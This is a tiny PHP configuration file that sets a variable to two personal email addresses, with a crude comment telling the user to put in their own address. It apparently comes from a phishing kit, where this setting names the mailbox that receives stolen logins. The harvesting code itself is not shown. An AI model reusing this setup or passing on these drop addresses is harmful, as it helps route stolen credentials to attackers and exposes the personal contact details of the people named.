<?php

$email = "cellconnectusa@gmail.com,bebostido@icloud.com"; // PUT UR FUCKING E-MAIL BRO

?>